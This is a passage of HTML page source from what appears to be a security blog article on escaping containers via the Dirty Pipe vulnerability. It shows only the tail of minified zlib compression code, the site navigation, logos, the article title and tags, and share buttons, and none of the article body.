Array(K+1);for(a=0,i=0;i<U-1;i++)for(it[i]=a,t=0;t<1<<W[i];t++)at[a++]=i;for(at[a-1]=i,r=0,i=0;i<16;i++)for(nt[i]=r,t=0;t<1<<J[i];t++)et[r++]=i;for(r>>=7;i<L;i++)for(nt[i]=r<<7,t=0;t<1<<J[i]-7;t++)et[256+r++]=i;for(e=0;e<=K;e++)s[e]=0;for(t=0;t<=143;)$[2*t+1]=8,t++,s[8]++;for(;t<=255;)$[2*t+1]=9,t++,s[9]++;for(;t<=279;)$[2*t+1]=7,t++,s[7]++;for(;t<=287;)$[2*t+1]=8,t++,s[8]++;for(u($,F+1,s),t=0;t<L;t++)tt[2*t+1]=5,tt[2*t]=d(t,5);rt=new n($,W,T+1,F,K),st=new n(tt,J,0,L,K),ot=new n(new Array(0),Q,0,H,P)}function b(t){var e;for(e=0;e<F;e++)t.dyn_ltree[2*e]=0;for(e=0;e<L;e++)t.dyn_dtree[2*e]=0;for(e=0;e<H;e++)t.bl_tree[2*e]=0;t.dyn_ltree[2*Y]=1,t.opt_len=t.static_len=0,t.last_lit=t.matches=0}function g(t){t.bi_valid>8?o(t,t.bi_buf):t.bi_valid>0&&(t.pending_buf[t.pending++]=t.bi_buf),t.bi_buf=0,t.bi_valid=0}function m(t,e,a,i){g(t),i&&(o(t,a),o(t,~a)),A.arraySet(t.pending_buf,t.window,e,a,t.pending),t.pending+=a}function w(t,e,a,i){var n=2*e,r=2*a;return t[n]<t[r]||t[n]===t[r]&&i[e]<=i[a]}function p(t,e,a){for(var i=t.heap[a],n=a<<1;n<=t.heap_len&&(n<t.heap_len&&w(e,t.heap[n+1],t.heap[n],t.depth)&&n++,!w(e,i,t.heap[n],t.depth));)t.heap[a]=t.heap[n],a=n,n<<=1;t.heap[a]=i}function v(t,e,a){var i,n,r,o,d=0;if(0!==t.last_lit)do{i=t.pending_buf[t.d_buf+2*d]<<8|t.pending_buf[t.d_buf+2*d+1],n=t.pending_buf[t.l_buf+d],d++,0===i?h(t,n,e):(h(t,(r=at[n])+T+1,e),0!==(o=W[r])&&l(t,n-=it[r],o),h(t,r=s(--i),a),0!==(o=J[r])&&l(t,i-=nt[r],o))}while(d<t.last_lit);h(t,Y,e)}function k(t,e){var a,i,n,r=e.dyn_tree,s=e.stat_desc.static_tree,o=e.stat_desc.has_stree,l=e.stat_desc.elems,h=-1;for(t.heap_len=0,t.heap_max=j,a=0;a<l;a++)0!==r[2*a]?(t.heap[++t.heap_len]=h=a,t.depth[a]=0):r[2*a+1]=0;for(;t.heap_len<2;)r[2*(n=t.heap[++t.heap_len]=h<2?++h:0)]=1,t.depth[n]=0,t.opt_len--,o&&(t.static_len-=s[2*n+1]);for(e.max_code=h,a=t.heap_len>>1;a>=1;a--)p(t,r,a);n=l;do{a=t.heap[1],t.heap[1]=t.heap[t.heap_len--],p(t,r,1),i=t.heap[1],t.heap[--t.heap_max]=a,t.heap[--t.heap_max]=i,r[2*n]=r[2*a]+r[2*i],t.depth[n]=(t.depth[a]>=t.depth[i]?t.depth[a]:t.depth[i])+1,r[2*a+1]=r[2*i+1]=n,t.heap[1]=n++,p(t,r,1)}while(t.heap_len>=2);t.heap[--t.heap_max]=t.heap[1],_(t,e),u(r,h,t.bl_count)}function y(t,e,a){var i,n,r=-1,s=e[1],o=0,l=7,h=4;for(0===s&&(l=138,h=3),e[2*(a+1)+1]=65535,i=0;i<=a;i++)n=s,s=e[2*(i+1)+1],++o<l&&n===s||(o<h?t.bl_tree[2*n]+=o:0!==n?(n!==r&&t.bl_tree[2*n]++,t.bl_tree[2*q]++):o<=10?t.bl_tree[2*G]++:t.bl_tree[2*X]++,o=0,r=n,0===s?(l=138,h=3):n===s?(l=6,h=3):(l=7,h=4))}function x(t,e,a){var i,n,r=-1,s=e[1],o=0,d=7,f=4;for(0===s&&(d=138,f=3),i=0;i<=a;i++)if(n=s,s=e[2*(i+1)+1],!(++o<d&&n===s)){if(o<f)do{h(t,n,t.bl_tree)}while(0!=--o);else 0!==n?(n!==r&&(h(t,n,t.bl_tree),o--),h(t,q,t.bl_tree),l(t,o-3,2)):o<=10?(h(t,G,t.bl_tree),l(t,o-3,3)):(h(t,X,t.bl_tree),l(t,o-11,7));o=0,r=n,0===s?(d=138,f=3):n===s?(d=6,f=3):(d=7,f=4)}}function z(t){var e;for(y(t,t.dyn_ltree,t.l_desc.max_code),y(t,t.dyn_dtree,t.d_desc.max_code),k(t,t.bl_desc),e=H-1;e>=3&&0===t.bl_tree[2*V[e]+1];e--);return t.opt_len+=3*(e+1)+5+5+4,e}function B(t,e,a,i){var n;for(l(t,e-257,5),l(t,a-1,5),l(t,i-4,4),n=0;n<i;n++)l(t,t.bl_tree[2*V[n]+1],3);x(t,t.dyn_ltree,e-1),x(t,t.dyn_dtree,a-1)}function S(t){var e,a=4093624447;for(e=0;e<=31;e++,a>>>=1)if(1&a&&0!==t.dyn_ltree[2*e])return R;if(0!==t.dyn_ltree[18]||0!==t.dyn_ltree[20]||0!==t.dyn_ltree[26])return C;for(e=32;e<T;e++)if(0!==t.dyn_ltree[2*e])return C;return R}function E(t,e,a,i){l(t,(O<<1)+(i?1:0),3),m(t,e,a,!0)}var A=t("../utils/common"),Z=4,R=0,C=1,N=2,O=0,D=1,I=2,U=29,T=256,F=T+1+U,L=30,H=19,j=2*F+1,K=15,M=16,P=7,Y=256,q=16,G=17,X=18,W=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],J=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],Q=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7],V=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],$=new Array(2*(F+2));i($);var tt=new Array(2*L);i(tt);var et=new Array(512);i(et);var at=new Array(256);i(at);var it=new Array(U);i(it);var nt=new Array(L);i(nt);var rt,st,ot,lt=!1;a._tr_init=function(t){lt||(c(),lt=!0),t.l_desc=new r(t.dyn_ltree,rt),t.d_desc=new r(t.dyn_dtree,st),t.bl_desc=new r(t.bl_tree,ot),t.bi_buf=0,t.bi_valid=0,b(t)},a._tr_stored_block=E,a._tr_flush_block=function(t,e,a,i){var n,r,s=0;t.level>0?(t.strm.data_type===N&&(t.strm.data_type=S(t)),k(t,t.l_desc),k(t,t.d_desc),s=z(t),n=t.opt_len+3+7>>>3,(r=t.static_len+3+7>>>3)<=n&&(n=r)):n=r=a+5,a+4<=n&&-1!==e?E(t,e,a,i):t.strategy===Z||r===n?(l(t,(D<<1)+(i?1:0),3),v(t,$,tt)):(l(t,(I<<1)+(i?1:0),3),B(t,t.l_desc.max_code+1,t.d_desc.max_code+1,s+1),v(t,t.dyn_ltree,t.dyn_dtree)),b(t),i&&g(t)},a._tr_tally=function(t,e,a){return t.pending_buf[t.d_buf+2*t.last_lit]=e>>>8&255,t.pending_buf[t.d_buf+2*t.last_lit+1]=255&e,t.pending_buf[t.l_buf+t.last_lit]=255&a,t.last_lit++,0===e?t.dyn_ltree[2*a]++:(t.matches++,e--,t.dyn_ltree[2*(at[a]+T+1)]++,t.dyn_dtree[2*s(e)]++),t.last_lit===t.lit_bufsize-1},a._tr_align=function(t){l(t,D<<1,3),h(t,Y,$),f(t)}},{"../utils/common":3}],15:[function(t,e,a){"use strict";e.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],"/":[function(t,e,a){"use strict";var i={};(0,t("./lib/utils/common").assign)(i,t("./lib/deflate"),t("./lib/inflate"),t("./lib/zlib/constants")),e.exports=i},{"./lib/deflate":1,"./lib/inflate":2,"./lib/utils/common":3,"./lib/zlib/constants":6}]},{},[])("/")});</script></head>

  <body class="article" id="/articles/dirty-pipe-container-escape-poc/">
    
<nav x-data="{
    mobile: false,
    mobileOpen: false,
    reactOnResize() {
      if (window.innerWidth &lt; 768) {
        this.mobile = true;
      } else {
        this.mobile = false;
        this.mobileOpen = false;
      }        
    }
  }" x-init="reactOnResize()" @resize.window.throttle.200ms="reactOnResize" class="navbar">
  <div class="navbar-container">

    <div class="navbar-logo-container">
      <a class="navbar-logo-link" href="https://securitylabs.datadoghq.com/">
        <svg class="navbar-logo-desktop" width="180" height="44" viewBox="0 0 180 44" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.6834 11.5604C16.2023 10.5233 18.1604 10.9316 17.8325 11.2433C17.2079 11.838 18.0391 11.6629 18.1286 12.7614C18.1949 13.5707 17.9305 14.0174 17.7037 14.2709C17.23 14.3334 16.6532 14.4494 15.9596 14.6749C15.5487 14.8081 15.1913 14.9567 14.8788 15.1058C14.7963 15.0514 14.7071 14.9866 14.6009 14.8946C13.5278 13.965 13.5635 12.3247 14.6834 11.5604ZM23.758 17.9673C24.0332 17.753 25.2862 17.3501 26.4461 17.2123C27.0551 17.1397 27.9223 17.0994 28.1084 17.2022C28.4755 17.4056 28.4759 18.0344 28.2243 18.6155C27.8587 19.4605 27.3392 20.3916 26.7527 20.4693C25.796 20.5954 24.8892 20.0772 23.8549 19.3029C23.4859 19.0273 23.2595 18.3539 23.758 17.9673ZM25.5045 9.75029C26.9183 10.4086 26.7334 11.6619 26.7721 12.3978C26.783 12.609 26.7795 12.7518 26.7617 12.8504C26.5655 12.7441 26.2561 12.6664 25.7665 12.6878C25.6219 12.694 25.4824 12.7107 25.3471 12.7324C24.826 12.453 24.514 11.9045 24.2294 11.3231C24.2031 11.2695 24.1829 11.2214 24.1639 11.1744C24.1558 11.1531 24.1453 11.1294 24.1387 11.11C24.1352 11.0999 24.1321 11.091 24.129 11.0809C23.972 10.5836 24.0767 10.4843 24.1441 10.331C24.212 10.1749 24.4678 10.0453 24.0906 9.91448C24.0581 9.90322 24.0166 9.89468 23.972 9.8877C24.2209 9.57757 24.9706 9.50188 25.5045 9.75029ZM17.7965 24.7356C16.2726 23.7555 14.6972 22.3508 14.0083 21.5741C13.8924 21.4868 13.9114 21.0994 13.9114 21.0994C14.5332 21.5838 17.1143 23.4303 19.8422 24.2733C20.804 24.5706 22.281 24.6832 23.5623 23.9554C24.5419 23.3992 25.7208 22.4304 26.4233 21.4325L26.552 21.6564C26.5473 21.8055 26.2228 22.5278 26.0588 22.8182C26.3562 22.9897 26.5787 23.0359 26.9098 23.1275L29.1699 22.7747C29.9797 21.4631 30.562 19.3473 29.9429 17.3344C29.5881 16.1797 27.7448 13.8807 27.6126 13.7534C27.1486 13.3082 27.6898 11.5852 26.7714 9.70733C25.7999 7.72079 23.2719 5.64809 22.1725 4.74603C22.497 4.9828 24.4904 5.78704 25.4184 6.90956C25.5053 6.79351 25.5417 6.19072 25.6216 6.03856C24.8237 4.9929 24.7617 3.13096 24.7617 2.63374C24.7617 1.72159 24.2977 0.687183 24.2977 0.687183C24.2977 0.687183 25.0967 1.31909 25.3025 2.40861C25.5456 3.69881 26.0654 4.71459 26.7524 5.57356C28.0522 7.19524 29.2253 8.02743 29.82 7.42852C30.5298 6.70812 29.1005 3.48844 27.2722 1.69093C25.1424 -0.404674 24.5834 -0.134135 23.3324 0.313398C22.3345 0.66894 21.7953 3.50746 19.1933 3.45118C18.7521 3.40033 17.6171 3.37161 17.0561 3.37665C17.3488 2.96793 17.5988 2.65237 17.5988 2.65237C17.5988 2.65237 16.7262 3.00326 15.983 3.44924L15.9249 3.36229C16.1761 2.83247 16.4459 2.49866 16.4459 2.49866C16.4459 2.49866 15.7489 2.91864 15.1127 3.42051C15.2286 2.789 15.6667 2.38727 15.6667 2.38727C15.6667 2.38727 14.7855 2.54757 13.6629 3.78343C12.3867 4.13199 12.0796 4.36216 11.0636 4.81241C9.41134 4.45143 8.63097 3.86882 7.8886 2.79599C7.32222 1.97738 6.31623 1.85318 5.28581 2.27587C3.78671 2.89846 1.8887 3.74889 1.8887 3.74889C1.8887 3.74889 2.50587 3.72521 3.15133 3.75354C2.26939 4.08813 1.4204 4.54847 1.4204 4.54847C1.4204 4.54847 1.83366 4.53372 2.34382 4.54303C1.99105 4.83608 1.79644 4.97582 1.46189 5.19823C0.654379 5.78433 0 6.46203 0 6.46203C0 6.46203 0.548546 6.21168 1.03972 6.07194C0.696247 6.86144 0.0147313 7.4421 0.139559 8.40859C0.260123 9.29162 1.34132 11.1081 2.73808 12.2237C2.85864 12.3207 4.76634 14.0864 6.20458 13.3613C7.6432 12.6374 8.20958 11.9912 8.44606 11.001C8.7244 9.86336 8.56585 9.00478 7.97311 6.53656C7.77734 5.72184 7.26756 4.04504 7.02061 3.24313L7.07605 3.20237C7.54629 4.19642 8.7496 6.81602 9.23496 8.57472C9.99245 11.3189 9.7552 12.7108 9.40902 13.2208C8.36504 14.7598 5.68705 14.9632 4.469 14.1101C4.28331 17.0647 4.94234 18.3653 5.16525 19.0205C5.0536 19.7735 5.54128 21.172 5.54128 21.172C5.54128 21.172 5.59672 20.5358 5.81963 20.2009C5.87933 20.9488 6.25536 21.8361 6.25536 21.8361C6.25536 21.8361 6.23288 21.2881 6.40423 20.8145C6.64535 21.2229 6.82291 21.3207 7.05047 21.6273C7.27802 22.4261 7.73663 23.0103 7.73663 23.0103C7.73663 23.0103 7.66104 22.5822 7.7029 22.1358C8.81938 23.2102 9.01166 24.7771 9.12331 25.9804C9.43577 29.2924 3.90921 31.9241 2.83771 33.9948C2.02594 35.2206 1.54058 37.1625 2.91485 38.3056C6.23831 41.0688 4.96211 41.8296 6.6252 43.0433C8.90661 44.7085 11.7629 43.9632 12.7348 42.6078C14.0881 40.7203 13.74 38.9394 13.2376 37.2747C12.8449 35.9725 11.7777 33.8093 10.4553 32.9717C9.10664 32.1162 7.79478 31.9555 6.68257 32.0708L6.7853 31.9528C8.38442 31.6345 10.0553 31.8104 11.2655 32.5894C12.639 33.4736 13.8951 34.99 14.5522 37.3131C15.2969 37.2068 15.4031 37.1586 16.0838 37.0616L14.5483 25.0931L17.7965 24.7356ZM18.6826 39.7365L18.5058 38.0768L21.9583 32.8027L25.8784 33.9496L29.2499 28.3126L33.2906 30.9815L36.3616 24.5348L37.4529 36.2754L18.6826 39.7365ZM37.4948 22.1291L25.1554 24.3687C24.85 24.7635 24.0944 25.4559 23.7308 25.6364C22.172 26.4224 21.1187 26.1946 20.2088 25.9578C19.6242 25.8091 19.2854 25.7253 18.7985 25.5068L15.7867 25.9205L17.615 41.1922L38.7528 37.3782L37.4948 22.1291Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M51.0036 28.7055H55.3629C59.4687 28.7055 61.5218 26.2904 61.5218 21.4568C61.5218 17.3428 59.4687 15.2837 55.3629 15.2837H51.0036V28.7055ZM55.9165 31.8904H47.3359V12.1108H55.9165C62.0978 12.1108 65.1922 15.2288 65.1922 21.4609C65.1922 28.4126 62.0978 31.8904 55.9165 31.8904Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M69.0341 31.8904H65.2676L73.6702 12.1108H77.6147L86.1984 31.8904H82.2543L79.7631 26.4956H73.4233L74.682 23.3155H78.7944L75.555 15.8856L69.0341 31.8904Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M84.1265 12.1108H99.1458V15.2913H93.4715V31.8904H89.8042V15.2913H84.1265V12.1108Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M101.031 31.8904H97.2646L105.667 12.1108H109.611L118.195 31.8904H114.248L111.756 26.4956H105.416L106.675 23.3155H110.788L107.548 15.8856L101.031 31.8904Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M124.298 28.7055H128.658C132.763 28.7055 134.819 26.2904 134.819 21.4568C134.819 17.3428 132.763 15.2837 128.658 15.2837H124.298V28.7055ZM129.211 31.8904H120.63V12.1108H129.211C135.396 12.1108 138.487 15.2288 138.487 21.4609C138.487 28.4126 135.396 31.8904 129.211 31.8904Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M150.912 28.8433C154.896 28.8433 156.89 26.5436 156.89 21.9413C156.89 17.4112 154.896 15.1449 150.912 15.1449C146.823 15.1449 144.78 17.4112 144.78 21.9413C144.78 26.5436 146.823 28.8433 150.912 28.8433ZM140.971 22.0274C140.971 15.3198 144.286 11.9678 150.912 11.9678C157.437 11.9678 160.696 15.3198 160.696 22.0274C160.696 28.6953 157.437 32.0307 150.912 32.0307C144.579 32.0307 141.268 28.6953 140.971 22.0274Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M176.002 23.885V28.5168C175.155 28.738 174.397 28.8467 173.731 28.8467C169.247 28.8467 167.006 26.4716 167.006 21.7238C167.006 17.3386 169.382 15.1486 174.134 15.1486C176.117 15.1486 177.962 15.5178 179.67 16.2568V12.9343C177.962 12.2911 176.025 11.9678 173.857 11.9678C166.752 11.9678 163.197 15.2173 163.197 21.7238C163.197 28.5929 166.69 32.0307 173.675 32.0307C176.078 32.0307 178.074 31.681 179.67 30.9784V20.6316H173.745L172.506 23.885H176.002Z"></path>
</svg>

        <svg class="navbar-logo-mobile" width="29" height="32" viewBox="0 0 29 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M10.6801 8.40742C11.7847 7.65314 13.2088 7.95011 12.9703 8.17679C12.5161 8.60925 13.1205 8.48194 13.1857 9.28082C13.2339 9.86939 13.0416 10.1943 12.8767 10.3786C12.5321 10.4241 12.1126 10.5085 11.6082 10.6725C11.3094 10.7693 11.0494 10.8774 10.8222 10.9858C10.7621 10.9463 10.6973 10.8992 10.62 10.8323C9.83961 10.1562 9.86555 8.96324 10.6801 8.40742ZM17.2781 13.0644C17.4783 12.9086 18.3895 12.6156 19.2331 12.5154C19.676 12.4626 20.3067 12.4332 20.442 12.508C20.709 12.6559 20.7093 13.1133 20.5263 13.5358C20.2605 14.1504 19.8827 14.8276 19.4561 14.8841C18.7603 14.9758 18.1008 14.5989 17.3486 14.0358C17.0802 13.8354 16.9156 13.3456 17.2781 13.0644ZM18.5491 7.09223C19.5773 7.57099 19.4428 8.4825 19.471 9.01772C19.4789 9.17128 19.4764 9.27516 19.4634 9.34687C19.3207 9.26952 19.0958 9.21306 18.7397 9.22859C18.6345 9.2331 18.533 9.24524 18.4346 9.26105C18.0557 9.0578 17.8287 8.65893 17.6218 8.23606C17.6026 8.19711 17.5879 8.1621 17.5741 8.12794C17.5682 8.11242 17.5606 8.0952 17.5558 8.08108C17.5533 8.07374 17.551 8.06725 17.5488 8.05991C17.4346 7.6983 17.5107 7.62604 17.5598 7.51453C17.6091 7.40105 17.7952 7.30677 17.5208 7.21164C17.4972 7.20345 17.467 7.19724 17.4346 7.19216C17.6156 6.96661 18.1608 6.91156 18.5491 7.09223ZM12.9429 17.9895C11.8346 17.2767 10.6888 16.2551 10.1878 15.6903C10.1035 15.6268 10.1174 15.345 10.1174 15.345C10.5696 15.6973 12.4467 17.0402 14.4307 17.6533C15.1302 17.8696 16.2044 17.9514 17.1362 17.4221C17.8487 17.0176 18.706 16.313 19.2169 15.5872L19.3105 15.7501C19.3071 15.8585 19.0711 16.3839 18.9519 16.595C19.1681 16.7198 19.33 16.7534 19.5707 16.82L21.2144 16.5634C21.8034 15.6095 22.2269 14.0708 21.7766 12.6068C21.5187 11.767 20.178 10.095 20.0819 10.0024C19.7444 9.67867 20.138 8.42559 19.4701 7.05987C18.7636 5.61512 16.925 4.1077 16.1255 3.45166C16.3614 3.62386 17.8112 4.20876 18.4861 5.02514C18.5493 4.94073 18.5758 4.50234 18.6339 4.39168C18.0536 3.6312 18.0085 2.27706 18.0085 1.91545C18.0085 1.25207 17.671 0.49977 17.671 0.49977C17.671 0.49977 18.2521 0.959336 18.4018 1.75172C18.5786 2.69005 18.9567 3.4288 19.4563 4.0535C20.4016 5.2329 21.2548 5.83813 21.6873 5.40256C22.2035 4.87863 21.164 2.53705 19.8344 1.22977C18.2854 -0.294308 17.8788 -0.097553 16.969 0.227926C16.2433 0.486502 15.8511 2.55088 13.9588 2.50995C13.6379 2.47297 12.8124 2.45208 12.4044 2.45575C12.6173 2.1585 12.7992 1.929 12.7992 1.929C12.7992 1.929 12.1645 2.18419 11.624 2.50854L11.5817 2.4453C11.7644 2.05998 11.9607 1.81721 11.9607 1.81721C11.9607 1.81721 11.4537 2.12265 10.9911 2.48765C11.0754 2.02836 11.394 1.73619 11.394 1.73619C11.394 1.73619 10.7531 1.85278 9.93663 2.75159C9.00849 3.00508 8.7852 3.17248 8.04624 3.49993C6.84461 3.2374 6.27707 2.81369 5.73716 2.03344C5.32525 1.4381 4.59362 1.34776 3.84423 1.65518C2.75397 2.10797 1.3736 2.72646 1.3736 2.72646C1.3736 2.72646 1.82245 2.70924 2.29188 2.72985C1.65047 2.97318 1.03302 3.30798 1.03302 3.30798C1.03302 3.30798 1.33357 3.29725 1.7046 3.30402C1.44803 3.51715 1.3065 3.61878 1.06319 3.78053C0.475912 4.20678 0 4.69966 0 4.69966C0 4.69966 0.398943 4.51758 0.756158 4.41596C0.506361 4.99013 0.0107136 5.41244 0.101498 6.11534C0.189181 6.75754 0.975506 8.07865 1.99133 8.88995C2.07901 8.96052 3.46643 10.2447 4.51242 9.71734C5.55869 9.19087 5.97061 8.72086 6.14259 8.00074C6.34502 7.17335 6.22971 6.54893 5.79862 4.75386C5.65625 4.16133 5.2855 2.94185 5.1059 2.35864L5.14622 2.329C5.48821 3.05194 6.36335 4.95711 6.71633 6.23616C7.26724 8.23194 7.09469 9.24422 6.84292 9.61515C6.08366 10.7344 4.13603 10.8823 3.25018 10.2619C3.11514 12.4107 3.59443 13.3566 3.75655 13.8331C3.67535 14.3807 4.03003 15.3978 4.03003 15.3978C4.03003 15.3978 4.07034 14.9352 4.23246 14.6915C4.27588 15.2355 4.54936 15.8808 4.54936 15.8808C4.54936 15.8808 4.533 15.4822 4.65762 15.1378C4.83299 15.4348 4.96211 15.5059 5.12761 15.729C5.29311 16.3099 5.62664 16.7348 5.62664 16.7348C5.62664 16.7348 5.57166 16.4234 5.60211 16.0988C6.41409 16.8801 6.55394 18.0197 6.63513 18.8948C6.86238 21.3036 2.84307 23.2175 2.06379 24.7235C1.47341 25.615 1.12042 27.0273 2.11989 27.8586C4.53695 29.8682 3.60881 30.4215 4.81833 31.3042C6.47753 32.5152 8.55485 31.9733 9.26167 30.9875C10.2459 29.6147 9.99274 28.3196 9.62735 27.1089C9.34174 26.1618 8.56557 24.5886 7.60387 23.9794C6.62301 23.3572 5.66893 23.2404 4.86005 23.3242L4.93477 23.2384C6.09776 23.0069 7.31291 23.1348 8.19313 23.7014C9.19203 24.3444 10.1055 25.4473 10.5834 27.1368C11.125 27.0595 11.2023 27.0245 11.6973 26.9539L10.5806 18.2495L12.9429 17.9895ZM13.5871 28.8937L13.4585 27.6866L15.9694 23.8509L18.8204 24.6851L21.2724 20.5854L24.2111 22.5264L26.4446 17.8379L27.2382 26.3765L13.5871 28.8937ZM27.2691 16.0879L18.295 17.7167C18.0729 18.0038 17.5234 18.5074 17.2589 18.6387C16.1252 19.2103 15.3592 19.0446 14.6975 18.8724C14.2724 18.7643 14.0259 18.7033 13.6718 18.5444L11.4814 18.8453L12.8111 29.9519L28.184 27.1782L27.2691 16.0879Z"></path>
</svg>

        <p class="navbar-logo-title">Security Labs</p>
      </a>
    </div>

    <div class="navbar-menu-container">
      <span x-show="mobile " class="navbar-menu-icon-container" style="display: none;">
        <span x-show="!mobileOpen" @click="mobileOpen = true">
          <svg class="navbar-menu-icon" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M29.3333 14.6667H2.66663V17.3334H29.3333V14.6667ZM29.3333 5.33337H2.66663V8.00004H29.3333V5.33337ZM29.3333 24H2.66663V26.6667H29.3333V24Z"></path>
</svg>

        </span>
        <span x-show="mobileOpen" @click="mobileOpen = false" style="display: none;">
          <svg class="navbar-menu-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M13.4143 12L21.4571 20.0429L20.0429 21.4571L12 13.4143L3.95713 21.4571L2.54288 20.0429L10.5858 12L2.54288 3.95713L3.95713 2.54288L12 10.5858L20.0429 2.54288L21.4571 3.95713L13.4143 12Z"></path>
</svg>

        </span>
      </span>

      <div x-show="!mobile || (mobile &amp;&amp; mobileOpen)" class="navbar-menu-list-container">
        <ul class="navbar-menu-list">
          
            <li class="navbar-menu-item  ">
  <a href="https://securitylabs.datadoghq.com/articles/" title="ARTICLES" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ARTICLES</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="https://securitylabs.datadoghq.com/cloud-security-atlas/" title="CLOUD SECURITY ATLAS" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">CLOUD SECURITY ATLAS</span>
    
  </a>
</li>
          
            <li class="navbar-menu-item  ">
  <a href="https://securitylabs.datadoghq.com/about/" title="ABOUT" class="navbar-menu-link" data-custom-name="Navbar link">
    <span class="">ABOUT</span>
    
  </a>
</li>
          
        </ul>
      </div>
    </div>

  </div>
</nav>
    
<header class="hero !bg-none !pb-15 !text-black">
  <div class="container">
    <p class="hero-category">emerging vulnerabilities</p>

    <span class="block pb-1 tablet:pb-2 desktop:pb-3"></span>

    <h1 class="hero-title w-11/12">Escaping containers using the Dirty Pipe vulnerability</h1>

    <span class="block pb-4 tablet:pb-2 desktop:pb-3"></span>

    <p class="hero-date">March 25, 2022</p>

    <span class="block pb-6 tablet:pb-8 desktop:pb-9"></span>

    <ul class="badge-list">
      
      <li class="inline-flex">




<a href="https://securitylabs.datadoghq.com/articles/?tag=emerging_vulnerability" aria-label="emerging vulnerability" class="inline-flex" data-custom-name="Search filter tag button">
  <button class="badge" type="button">
    emerging vulnerability
  </button>
</a></li>
      
      <li class="inline-flex">




<a href="https://securitylabs.datadoghq.com/articles/?tag=container_security" aria-label="container security" class="inline-flex" data-custom-name="Search filter tag button">
  <button class="badge" type="button">
    container security
  </button>
</a></li>
      
      <li class="inline-flex">




<a href="https://securitylabs.datadoghq.com/articles/?tag=kubernetes" aria-label="kubernetes" class="inline-flex" data-custom-name="Search filter tag button">
  <button class="badge" type="button">
    kubernetes
  </button>
</a></li>
      
    </ul>

    <span class="block pb-4 tablet:pb-6"></span>

    <div class="share-article">
  <ul class="flex gap-3 desktop:gap-4">
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fdirty-pipe-container-escape-poc%2F&amp;text=Escaping%20containers%20using%20the%20Dirty%20Pipe%20vulnerability" title="twitter" data-custom-name="Social link">
          <svg class="fill-blue-1 hover:fill-blue-2 active:fill-blue-1" width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="20" cy="20" r="20"></circle>
<g clip-path="url(#clip0_37_5902)">
<path d="M32.9092 13.3016C32.01 13.693 31.0567 13.9458 30.0817 14.0513C31.1112 13.4379 31.8818 12.4703 32.2492 11.3299C31.2957 11.9088 30.2509 12.322 29.1592 12.5519C28.486 11.8187 27.6064 11.3066 26.6363 11.083C25.6662 10.8594 24.6511 10.9347 23.7247 11.2991C22.7983 11.6636 22.004 12.2999 21.4465 13.1245C20.8891 13.949 20.5945 14.9229 20.6017 15.9181C20.6016 16.2966 20.6444 16.6738 20.7292 17.0427C18.7718 16.9435 16.8571 16.4344 15.109 15.5484C13.361 14.6625 11.8185 13.4194 10.5817 11.8996C10.142 12.6499 9.91154 13.5042 9.91418 14.3737C9.90958 15.1884 10.1072 15.9916 10.4894 16.7112C10.8716 17.4309 11.4265 18.0445 12.1042 18.4971C11.3153 18.4784 10.5429 18.2674 9.85418 17.8823V17.9423C9.85385 19.0784 10.2464 20.1797 10.9654 21.0596C11.6843 21.9395 12.6855 22.5439 13.7992 22.7705C13.3763 22.8854 12.9399 22.9433 12.5017 22.9429C12.192 22.9434 11.883 22.9133 11.5792 22.8529C11.8923 23.8314 12.5041 24.6872 13.3287 25.3003C14.1532 25.9135 15.1492 26.2531 16.1767 26.2716C14.4307 27.64 12.2753 28.3819 10.0567 28.3783C9.67264 28.3676 9.28951 28.3351 8.90918 28.2808C11.1581 29.7303 13.7784 30.4983 16.4542 30.4925C25.5142 30.4925 30.4642 22.9954 30.4642 16.4879C30.4642 16.278 30.4642 16.0605 30.4642 15.8506C31.4253 15.1541 32.2534 14.2907 32.9092 13.3016Z" fill="white"></path>
</g>
<defs>
<clippath id="clip0_37_5902">
<rect width="24" height="19.5" fill="white" transform="translate(10 11)"></rect>
</clippath>
</defs>
</svg>

          <span class="sr-only">twitter</span>
        </a>
      </li>
    
      
      
      
      
      <li class="inline-flex">
        <a href="https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fdirty-pipe-container-escape-poc%2F" title="reddit" data-custom-name="Social link">
          <svg class="fill-orange-3 hover:fill-orange-4 active:fill-orange-3" width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20 40C31.0457 40 40 31.0457 40 20C40 8.95431 31.0457 0 20 0C8.95431 0 0 8.95431 0 20C0 31.0457 8.95431 40 20 40Z"></path>
